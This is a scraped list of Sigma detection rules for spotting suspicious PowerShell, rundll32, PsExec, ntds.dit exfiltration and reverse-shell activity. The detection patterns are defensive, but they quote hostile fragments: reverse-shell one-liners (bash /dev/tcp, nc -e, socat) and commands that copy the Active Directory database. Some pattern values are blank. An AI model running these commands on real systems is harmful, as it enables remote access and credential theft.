<li><a href="#">title:Suspicious PowerShell Parent Process id: 754ed792-634f-40ae-b3bc-e0448d33f695 status: test description: Detects a suspicious parents of powershell.exe author: Teymur Kheirkhabarov, Harish Segar (rule) references: - date: 2020/03/20 modified: 2022/03/21 logsource: category: process_creation product: windows detection: selection_image1: - ParentImage|endswith: - '\mshta.exe' - '\rundll32.exe' - '\regsvr32.exe' - '\services.exe' - '\winword.exe' - '\wmiprvse.exe' - '\powerpnt.exe' - '\excel.exe' - '\msaccess.exe' - '\mspub.exe' - '\visio.exe' - '\outlook.exe' - '\amigo.exe' - '\chrome.exe' - '\firefox.exe' - '\iexplore.exe' - '\microsoftedgecp.exe' - '\microsoftedge.exe' - '\browser.exe' - '\vivaldi.exe' - '\safari.exe' - '\sqlagent.exe' - '\sqlserver.exe' - '\sqlservr.exe' - '\w3wp.exe' - '\httpd.exe' - '\nginx.exe' - '\php-cgi.exe' - '\jbosssvc.exe' - 'MicrosoftEdgeSH.exe' - ParentImage|contains: 'tomcat' selection_powershell: - Image|endswith: '\powershell.exe' - CommandLine|contains: - 'powershell' - 'pwsh' - Description: 'Windows PowerShell' - Product: 'PowerShell Core 6' condition: all of selection* falsepositives: - Other scripts level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Sub Processes id: e4b6d2a7-d8a4-4f19-acbd-943c16d90647 description: Detects suspicious sub processes spawned by PowerShell status: experimental author: Florian Roth date: 2022/04/26 references: - logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\powershell.exe' Image|endswith: - '\sh.exe' - '\bash.exe' - '\schtasks.exe' - '\certutil.exe' - '\bitsadmin.exe' - '\wscript.exe' - '\cscript.exe' - '\scrcons.exe' - '\regsvr32.exe' - '\hh.exe' - '\wmic.exe' - '\mshta.exe' - '\rundll32.exe' - '\forfiles.exe' - '\scriptrunner.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious PowerShell WindowStyle Option id: 313fbb0a-a341-4682-848d-6d6f8c4fab7c status: experimental references: - description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden tags: - attack.defense_evasion - attack.t1564.003 author: frack113 date: 2021/10/20 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'powershell' - 'WindowStyle' - 'Hidden' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Printer Driver Empty Manufacturer id: e0813366-0407-449a-9869-a2db1119dc41 status: test description: Detects a suspicious printer driver installation with an empty Manufacturer value author: Florian Roth references: - date: 2020/07/01 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains|all: - '\Control\Print\Environments\Windows x64\Drivers' - '\Manufacturer' Details: '(Empty)' filter_cutepdf: TargetObject|contains: '\CutePDF Writer v4.0\' condition: selection and not 1 of filter_* falsepositives: - Alerts on legitimate printer drivers that do not set any more details in the Manufacturer value level: high tags: - attack.privilege_escalation - attack.t1574 - cve.2021.1675 
<li><a href="#">title:Suspicious PrinterPorts Creation (CVE-2020-1048) id: cc08d590-8b90-413a-aff6-31d1a99678d7 status: test description: Detects new commands that add new printer port which point to suspicious file author: EagleEye Team, Florian Roth references: - date: 2020/05/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'Add-PrinterPort -Name' selection2: CommandLine|contains: - '.exe' - '.dll' - '.bat' selection3: CommandLine|contains: 'Generic / Text Only' condition: ( selection1 and selection2 ) or selection3 falsepositives: - New printer port install on host level: high tags: - attack.persistence - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious Process Discovery With Get-Process id: af4c87ce-bdda-4215-b998-15220772e993 status: experimental description: Get the processes that are running on the local computer. date: 2022/03/17 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: Get-Process condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.discovery - attack.t1057 
<li><a href="#">title:Suspicious Process Parents id: cbec226f-63d9-4eca-9f52-dfb6652f24df status: experimental description: Detects suspicious parent processes that should not have any children or should only have a single possible child program references: - - author: Florian Roth date: 2022/03/21 modified: 2022/03/28 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\notepad.exe' - '\minesweeper.exe' - '\winver.exe' - '\bitsadmin.exe' selection_special: ParentImage|endswith: - '\csrss.exe' - '\certutil.exe' - '\schtasks.exe' - '\eventvwr.exe' - '\calc.exe' filter_special: Image|endswith: - '\WerFault.exe' - '\wermgr.exe' - '\conhost.exe' # csrss.exe, certutil.exe - '\mmc.exe' # eventvwr.exe - '\win32calc.exe' # calc.exe filter_null: Image: null condition: selection or ( selection_special and not 1 of filter_* ) falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Process Patterns NTDS.DIT Exfil id: 8bc64091-6875-4881-aaf9-7bd25b5dda08 description: Detects suspicious process patterns used in NTDS.DIT exfiltration status: experimental author: Florian Roth references: - - - - - - date: 2022/03/11 tags: - attack.credential_access - attack.t1003.003 logsource: product: windows category: process_creation detection: selection_tool: # - Image|endswith: - '\NTDSDump.exe' - '\NTDSDumpEx.exe' - CommandLine|contains|all: # ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv - 'ntds.dit' - 'system.hiv' - CommandLine|contains: 'NTDSgrab.ps1' selection_oneliner_1: # powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q" CommandLine|contains|all: - 'ac i ntds' - 'create full' selection_onliner_2: # cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit CommandLine|contains|all: - '/c copy ' - '\windows\ntds\ntds.dit' selection_powershell: CommandLine|contains|all: - 'powershell' - 'ntds.dit' set1_selection_ntds_dit: CommandLine|contains: 'ntds.dit' set1_selection_image_folder: - ParentImage|contains: - '\apache' - '\tomcat' - '\AppData\' - '\Temp\' - '\Public\' - '\PerfLogs\' - Image|contains: - '\apache' - '\tomcat' - '\AppData\' - '\Temp\' - '\Public\' - '\PerfLogs\' condition: 1 of selection* or all of set1* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Process Start Locations id: 15b75071-74cc-47e0-b4c6-b43744a62a2b status: test description: Detects suspicious process run from unusual locations author: juju4, Jonhnathan Ribeiro, oscd.community references: - date: 2019/01/16 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: - Image|contains: - ':\RECYCLER\' - ':\SystemVolumeInformation\' - Image|startswith: - 'C:\Windows\Tasks\' - 'C:\Windows\debug\' - 'C:\Windows\fonts\' - 'C:\Windows\help\' - 'C:\Windows\drivers\' - 'C:\Windows\addins\' - 'C:\Windows\cursors\' - 'C:\Windows\system32\tasks\' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1036 - car.2013-05-002 
<li><a href="#">title:Suspicious Process Writes Ntds.dit id: 11b1ed55-154d-4e82-8ad7-83739298f720 status: experimental description: Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file references: - - author: Florian Roth date: 2022/01/11 tags: - attack.credential_access - attack.t1003.002 - attack.t1003.003 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '\ntds.dit' Image|endswith: - '\powershell.exe' - '\cmd.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Processes Spawned by WinRM id: 5cc2cda8-f261-4d88-a2de-e9e193c86716 description: Detects suspicious processes including shells spawnd from WinRM host process status: experimental author: Andreas Hunkeler (@Karneades), Markus Neis date: 2021/05/20 modified: 2022/06/16 tags: - attack.t1190 - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\wsmprovhost.exe' Image|endswith: - '\cmd.exe' - '\sh.exe' - '\bash.exe' - '\powershell.exe' - '\wsl.exe' - '\schtasks.exe' - '\certutil.exe' - '\whoami.exe' - '\bitsadmin.exe' condition: selection falsepositives: - Legitimate WinRM usage level: high 
<li><a href="#">title:Suspicious PROCEXP152.sys File Created In TMP id: 3da70954-0f2c-4103-adff-b7440368f50e status: test description: Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder. This driver is used by Sysinternals Process Explorer but also by KDU () or Ghost-In-The-Logs (), which uses KDU. author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - date: 2019/04/08 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection_1: TargetFilename|contains: '\AppData\Local\Temp\' TargetFilename|endswith: 'PROCEXP152.sys' selection_2: Image|contains: - '\procexp64.exe' - '\procexp.exe' - '\procmon64.exe' - '\procmon.exe' condition: selection_1 and not selection_2 falsepositives: - Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don't rely on it. level: medium tags: - attack.t1562.001 - attack.defense_evasion 
<li><a href="#">title:Suspicious Program Location with Network Connections id: 7b434893-c57d-4f41-908d-6a17bf1ae98f status: test description: Detects programs with network connections running in suspicious files system locations author: Florian Roth, Tim Shelton references: - date: 2017/03/19 modified: 2022/05/26 logsource: category: network_connection product: windows definition: 'Use the following config to generate the necessary Event ID 3 Network Connection events' detection: selection: - Image|contains: # - '\ProgramData\\' # too many false positives, e.g. with Webex for Windows - '\Users\All Users\' - '\Users\Default\' - '\Users\Public\' - '\Users\Contacts\' - '\Users\Searches\' - '\config\systemprofile\' - '\Windows\Fonts\' - '\Windows\IME\' - '\Windows\addins\' - Image|endswith: - '\$Recycle.bin' - Image|startswith: - 'C:\Perflogs\' false_positive1: Image|startswith: 'C:\Users\Public\IBM\ClientSolutions\Start_Programs\' # IBM Client Solutions Default Location condition: selection and not 1 of false_positive* falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Suspicious Program Names id: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6 status: experimental description: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools author: Florian Roth date: 2022/02/11 references: - logsource: category: process_creation product: windows detection: selection_image: - Image|contains: '\CVE-202' - Image|endswith: - '\poc.exe' - '\artifact.exe' - '\artifact64.exe' - '\artifact_protected.exe' - '\artifact32.exe' - '\artifact32big.exe' - 'obfuscated.exe' - 'obfusc.exe' - '\meterpreter' selection_commandline: CommandLine|contains: - 'inject.ps1' - 'Invoke-CVE' - 'pupy.ps1' - 'payload.ps1' - 'beacon.ps1' - 'PowerView.ps1' - 'bypass.ps1' - 'obfuscated.ps1' - 'obfusc.ps1' - 'obfus.ps1' - 'obfs.ps1' - 'evil.ps1' - 'MiniDogz.ps1' - '_enc.ps1' - '\shell.ps1' - '\rshell.ps1' - 'revshell.ps1' - '\av.ps1' - '\av_test.ps1' - 'adrecon.ps1' - 'mimikatz.ps1' - '\PowerUp_' - 'powerup.ps1' - '\Temp\a.ps1' - '\Temp\p.ps1' - '\Temp\1.ps1' - 'Hound.ps1' - 'encode.ps1' - 'powercat.ps1' condition: 1 of selection* falsepositives: - Legitimate tools that accidentally match on the searched patterns level: high fields: - CommandLine - ParentCommandLine - CurrentDirectory 
<li><a href="#">title:Suspicious PsExec Execution - Zeek id: f1b3a22a-45e6-4004-afb5-4291f9c21166 status: test description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one author: 'Samir Bousseaden, @neu5ron' references: - date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection1: path|contains|all: - '\\' - '\IPC$' name|endswith: - '-stdin' - '-stdout' - '-stderr' selection2: name|contains|all: - '\\' - '\IPC$' path|startswith: 'PSEXESVC' condition: selection1 and not selection2 falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Suspicious PsExec Execution id: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82 status: test description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one author: Samir Bousseaden references: - date: 2019/04/03 modified: 2021/12/08 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection1: EventID: 5145 ShareName: \\\*\IPC$ RelativeTargetName|endswith: - '-stdin' - '-stdout' - '-stderr' filter: RelativeTargetName|startswith: 'PSEXESVC' condition: selection1 and not filter falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Suspicious Query of MachineGUID id: f5240972-3938-4e56-8e4b-e33893176c1f status: experimental description: Use of reg to get MachineGuid information author: frack113 references: - date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \reg.exe CommandLine|contains|all: - 'SOFTWARE\Microsoft\Cryptography' - '/v ' - 'MachineGuid' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 
<li><a href="#">title:Suspicious RASdial Activity id: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e status: test description: Detects suspicious process related to rasdial.exe author: juju4 references: - date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: rasdial.exe condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.execution - attack.t1059 
<li><a href="#">title:Suspicious RazerInstaller Explorer Subprocess id: a4eaf250-7dc1-4842-862a-5e71cd59a167 status: experimental description: Detects a explorer.exe sub process of the RazerInstaller software which can be invoked from the installer to select a different installation folder but can also be exploited to escalate privileges to LOCAL SYSTEM references: - - author: Florian Roth, Maxime Thiebaut date: 2021/08/23 modified: 2021/08/24 tags: - attack.privilege_escalation - attack.t1553 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\RazerInstaller.exe' IntegrityLevel: 'System' filter: Image|startswith: 'C:\Windows\Installer\Razer\Installer\' condition: selection and not filter falsepositives: - User selecting a different installation folder (check for other sub processes of this explorer.exe process) level: high 
<li><a href="#">title:Suspicious RDP Redirect Using TSCON id: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb status: test description: Detects a suspicious RDP session redirect using tscon.exe author: Florian Roth references: - - date: 2018/03/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' /dest:rdp-tcp:' condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1563.002 - attack.t1021.001 - car.2013-07-002 
<li><a href="#">title:Suspicious Reconnaissance Activity id: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0 status: experimental description: Detects suspicious command line activity on Windows systems author: Florian Roth, omkar72, @svch0st date: 2019/01/16 modified: 2022/06/09 references: - - tags: - attack.discovery - attack.t1087.001 - attack.t1087.002 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - net group "domain admins" - net localgroup administrators - net group "enterprise admins" - net accounts /do condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Inventory tool runs - Administrative activity analysis: recommendation: Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM) level: medium 
<li><a href="#">title:Suspicious Recursif Takeown id: 554601fb-9b71-4bcc-abf4-21a611be4fde status: experimental description: Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders author: frack113 references: - - date: 2022/01/30 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\takeown.exe' CommandLine|contains|all: - '/f ' - '/r' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins - Administrative activity level: medium tags: - attack.defense_evasion - attack.t1222.001 
<li><a href="#">title:Suspicious Redirection to Local Admin Share id: ab9e3b40-0c85-4ba1-aede-455d226fd124 status: experimental description: Detects a suspicious output redirection to the local admins share as often found in malicious scripts or hacktool stagers author: Florian Roth date: 2022/01/16 modified: 2022/02/01 references: - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '> \\\\127.0.0.1\\admin$' - '> \\\\localhost\\admin$' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Reg Add BitLocker id: 0e0255bf-2548-47b8-9582-c0955c9283f5 status: experimental description: Suspicious add key for BitLocker references: - tags: - attack.impact - attack.t1486 author: frack113 date: 2021/11/15 logsource: category: process_creation product: windows detection: set: CommandLine|contains|all: - 'REG' - 'ADD' - 'HKLM\SOFTWARE\Policies\Microsoft\FVE' - '/v' - '/f' key: CommandLine|contains: - 'EnableBDEWithNoTPM' - 'UseAdvancedStartup' - 'UseTPM' - 'UseTPMKey' - 'UseTPMKeyPIN' - 'RecoveryKeyMessageSource' - 'UseTPMPIN' - 'RecoveryKeyMessage' condition: set and key falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Reg Add Open Command id: dd3ee8cc-f751-41c9-ba53-5a32ed47e563 status: experimental description: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key references: - author: frack113 date: 2021/12/20 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - 'reg' - 'add' - 'hkcu\software\classes\ms-settings\shell\open\command' - '/ve ' - '/d' selection_2: CommandLine|contains|all: - 'reg' - 'add' - 'hkcu\software\classes\ms-settings\shell\open\command' - '/v' - 'DelegateExecute' selection_3: CommandLine|contains|all: - 'reg' - 'delete' - 'hkcu\software\classes\ms-settings' condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1003 
<li><a href="#">title:Suspicious Registration via cscript.exe id: 28c8f68b-098d-45af-8d43-8089f3e35403 description: Detects when the registration of a VSS/VDS Provider as a COM+ application. status: experimental author: Austin Songer @austinsonger date: 2021/11/05 references: - - logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\cscript.exe' CommandLine|contains: '-register' selection2: CommandLine|contains: - '\Windows Kits\10\bin\10.0.22000.0\x64' - '\Windows Kits\10\bin\10.0.19041.0\x64' - '\Windows Kits\10\bin\10.0.17763.0\x64' condition: selection1 and selection2 fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1218 level: medium falsepositives: - Unknown 
<li><a href="#">title:Suspicious Regsvr32 Execution With Image Extension id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e status: experimental description: utilizes REGSVR32.exe to execute this DLL masquerading as a Image file references: - - tags: - attack.defense_evasion - attack.t1218.010 author: frack113 date: 2021/11/29 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regsvr32.exe' CommandLine|endswith: '.jpg' # can add other condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Regsvr32 HTTP IP Pattern id: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8 status: experimental description: Detects a certain command line flag combination used by regsvr32 when used to download and register a DLL from a remote address which uses HTTP (not HTTPS) and a IP address and not FQDN references: - - tags: - attack.defense_evasion - attack.t1218.010 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection_flags: CommandLine|contains|all: - ' /s' - ' /u' selection_ip: CommandLine|contains: - ' /i:' - ' /i:' - ' /i:' - ' /i:' - ' /i:' - ' /i:' - ' /i:' - ' /i:' - ' /i:' condition: all of selection* falsepositives: - FQDNs that start with a number level: high 
<li><a href="#">title:Suspicious Rejected SMB Guest Logon From IP id: 71886b70-d7b4-4dbf-acce-87d2ca135262 description: Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in Windows Spooler Service author: Florian Roth, KevTheHermit, fuzzyf10w status: experimental level: medium references: - - - date: 2021/06/30 modified: 2021/07/05 logsource: product: windows service: smbclient-security detection: selection: EventID: 31017 Description|contains: 'Rejected an insecure guest logon' UserName: '' ServerName|startswith: '\1' condition: selection fields: - Computer - User falsepositives: - Account fallback reasons (after failed login with specific account) tags: - attack.credential_access - attack.t1110.001 
<li><a href="#">title:Suspicious Remote Logon with Explicit Credentials id: 941e5c45-cda7-4864-8cea-bbb7458d194a status: experimental description: Detects suspicious processes logging on with explicit credentials references: - author: 'oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st' date: 2020/10/05 modified: 2021/11/12 tags: - attack.t1078 - attack.lateral_movement logsource: product: windows service: security detection: selection: EventID: 4648 ProcessName|endswith: - '\cmd.exe' - '\powershell.exe' - '\pwsh.exe' - '\winrs.exe' - '\wmic.exe' - '\net.exe' - '\net1.exe' - '\reg.exe' filter: TargetServerName: 'localhost' condition: selection and not filter falsepositives: - Administrators that use the RunAS command or scheduled tasks level: medium 
<li><a href="#">title:Suspicious Remote Thread Created id: 66d31e5f-52d6-40a4-9615-002d3789a119 description: Offensive tradecraft is switching away from using APIs like "CreateRemoteThread", however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes. notes: - MonitoringHost.exe is a process that loads .NET CLR by default and thus a favorite for process injection for .NET in-memory offensive tools. status: experimental date: 2019/10/27 modified: 2022/06/30 author: Perez Diego (@darkquassar), oscd.community references: - Personal research, statistical analysis - logsource: product: windows category: create_remote_thread tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1055 detection: selection: SourceImage|endswith: - '\bash.exe' - '\cvtres.exe' - '\defrag.exe' - '\dnx.exe' - '\esentutl.exe' - '\excel.exe' - '\expand.exe' - '\explorer.exe' - '\find.exe' - '\findstr.exe' - '\forfiles.exe' - '\git.exe' - '\gpupdate.exe' - '\hh.exe' - '\iexplore.exe' - '\installutil.exe' - '\lync.exe' - '\makecab.exe' - '\mDNSResponder.exe' - '\monitoringhost.exe' - '\msbuild.exe' - '\mshta.exe' - '\msiexec.exe' - '\mspaint.exe' - '\outlook.exe' - '\ping.exe' - '\powerpnt.exe' - '\powershell.exe' - '\provtool.exe' - '\python.exe' - '\regsvr32.exe' - '\robocopy.exe' - '\runonce.exe' - '\sapcimc.exe' - '\schtasks.exe' - '\smartscreen.exe' - '\spoolsv.exe' # - '\taskhost.exe' # disabled due to false positives - '\tstheme.exe' - '\userinit.exe' - '\vssadmin.exe' - '\vssvc.exe' - '\w3wp.exe' - '\winlogon.exe' - '\winscp.exe' - '\wmic.exe' - '\word.exe' - '\wscript.exe' filter1: SourceImage|contains: 'Visual Studio' filter2: SourceImage: 'C:\Windows\System32\winlogon.exe' TargetImage: - 'C:\Windows\System32\services.exe' # happens on Windows 7 - 'C:\Windows\System32\wininit.exe' # happens on Windows 7 - 'C:\Windows\System32\csrss.exe' # multiple OS filter3: SourceImage: 'C:\Windows\System32\provtool.exe' TargetParentProcessId: 0 filter4: SourceImage|endswith: '\git.exe' TargetImage|endswith: - '\bin\git.exe' - 'C:\Windows\System32\conhost.exe' condition: selection and not 1 of filter* fields: - ComputerName - User - SourceImage - TargetImage level: high falsepositives: - Unknown 
<li><a href="#">title:Suspicious Reverse Shell Command Line id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab status: test description: Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell author: Florian Roth references: - date: 2019/04/02 modified: 2021/11/27 logsource: product: linux detection: keywords: - 'BEGIN {s = "/inet/tcp/0/' - 'bash -i >& /dev/tcp/' - 'bash -i >& /dev/udp/' - 'sh -i >$ /dev/udp/' - 'sh -i >$ /dev/tcp/' - '&& while read line 0<&5; do' - '/bin/bash -c exec 5<>/dev/tcp/' - '/bin/bash -c exec 5<>/dev/udp/' - 'nc -e /bin/sh ' - '/bin/sh | nc' - 'rm -f backpipe; mknod /tmp/backpipe p && nc ' - ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))' - ';STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' - '/bin/sh -i <&3 >&3 2>&3' - 'uname -a; w; id; /bin/bash -i' - '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};' - ';os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');' - '.to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' - ';while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print' - 'socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:' - 'rm -f /tmp/p; mknod /tmp/p p &&' - ' | /bin/bash | telnet ' - ',echo=0,raw tcp-listen:' - 'nc -lvvp ' - 'xterm -display 1' condition: keywords falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 
<li><a href="#">title:Suspicious Run Key from Download id: 9c5037d1-c568-49b3-88c7-9846a5bdc2be status: test description: Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories author: Florian Roth references: - date: 2019/10/01 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: Image|contains: - '\Downloads\' - '\Temporary Internet Files\Content.Outlook\' - '\Local Settings\Temporary Internet Files\' TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' condition: selection falsepositives: - Software installers downloaded and used by users level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Suspicious Rundll32 Activity id: e593cf51-88db-4ee1-b920-37e89012a3c9 status: test description: Detects suspicious process related to rundll32 based on arguments author: juju4, Jonhnathan Ribeiro, oscd.community references: - - - - date: 2019/01/16 modified: 2022/05/09 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains|all: - 'javascript:' - '.RegisterXLL' - CommandLine|contains|all: - 'url.dll' - 'OpenURL' - CommandLine|contains|all: - 'url.dll' - 'OpenURLA' - CommandLine|contains|all: - 'url.dll' - 'FileProtocolHandler' - CommandLine|contains|all: - 'zipfldr.dll' - 'RouteTheCall' - CommandLine|contains|all: - 'shell32.dll' - 'Control_RunDLL' - CommandLine|contains|all: - 'shell32.dll' - 'ShellExec_RunDLL' - CommandLine|contains|all: - 'mshtml.dll' - 'PrintHTML' - CommandLine|contains|all: - 'advpack.dll' - 'LaunchINFSection' - CommandLine|contains|all: - 'advpack.dll' - 'RegisterOCX' - CommandLine|contains|all: - 'ieadvpack.dll' - 'LaunchINFSection' - CommandLine|contains|all: - 'ieadvpack.dll' - 'RegisterOCX' - CommandLine|contains|all: - 'ieframe.dll' - 'OpenURL' - CommandLine|contains|all: - 'shdocvw.dll' - 'OpenURL' - CommandLine|contains|all: - 'syssetup.dll' - 'SetupInfObjectInstallAction' - CommandLine|contains|all: - 'setupapi.dll' - 'InstallHinfSection' - CommandLine|contains|all: - 'pcwutl.dll' - 'LaunchApplication' - CommandLine|contains|all: - 'dfshim.dll' - 'ShOpenVerbApplication' - CommandLine|contains|all: - 'dfshim.dll' - 'ShOpenVerbShortcut' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Suspicious Rundll32 Activity Invoking Sys File id: 731231b9-0b5d-4219-94dd-abb6959aa7ea description: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452 status: experimental references: - tags: - attack.defense_evasion - attack.t1218.011 author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'rundll32.exe' selection2: CommandLine|contains: - '.sys,' - '.sys ' condition: selection1 and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Rundll32 Invoking Inline VBScript id: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd description: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452 status: experimental references: - author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'rundll32.exe' - 'Execute' - 'RegRead' - 'window.close' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1055 
<li><a href="#">title:Suspicious Rundll32 Script in CommandLine id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7 status: experimental description: Detects suspicious process related to rundll32 based on arguments author: frack113 references: - - date: 2021/12/04 logsource: category: process_creation product: windows detection: selection_run: CommandLine|contains|all: - rundll32 - 'mshtml,RunHTMLApplication' selection_script: CommandLine|contains: - 'javascript:' - 'vbscript:' condition: all of selection_* falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Suspicious Rundll32 Setupapi.dll Activity id: 285b85b1-a555-4095-8652-a8a4106af63f status: test description: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file. author: Konstantin Grishchenko, oscd.community references: - - - - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\runonce.exe' ParentImage|endswith: '\rundll32.exe' ParentCommandLine|contains|all: - 'setupapi.dll' - 'InstallHinfSection' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Scripts and administrative tools that use INF files for driver installation with setupapi.dll level: medium tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Suspicious Rundll32 Without Any CommandLine Params id: 1775e15e-b61b-4d14-a1a3-80981298085a description: Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity status: experimental references: - author: Florian Roth date: 2021/05/27 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: '\rundll32.exe' filter1: ParentImage|endswith: '\svchost.exe' filter2: ParentImage|contains: - '\AppData\Local\' - '\Microsoft\Edge\' condition: selection and not filter1 and not filter2 fields: - ParentImage - ParentCommandLine falsepositives: - Possible but rare level: high tags: - attack.defense_evasion - attack.t1202 
